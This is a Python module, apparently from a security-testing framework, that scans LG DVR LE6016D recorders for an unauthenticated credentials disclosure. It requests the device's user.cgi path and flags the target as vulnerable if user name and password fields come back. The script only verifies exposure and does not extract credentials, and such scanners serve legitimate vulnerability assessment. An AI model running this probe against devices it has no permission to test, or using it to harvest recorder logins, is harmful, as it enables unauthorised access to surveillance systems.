import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "lg_dvr_credentials_disclosure/device_rsp_scan"
        self.description = "LG DVR LE6016D Unauthenticated Credentials Disclosure Vector (Scanner)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;36m[*] Running verification script: lg_dvr_credentials_disclosure/device_rsp_scan...\033[0m")
        
        url = f"http://{target}:{port}/dvr/wwwroot/user.cgi" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}/dvr/wwwroot/user.cgi"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.get(url, headers=headers)
                
                # Validation basée sur le code 200 et les balises de données utilisateur LG
                if response.status_code == 200 and "<name>" in response.text and "<pw>" in response.text:
                    return {
                        "vulnerable": True,
                        "details": "Target recorder is VULNERABLE. Core user.cgi database structure is exposed publicly."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
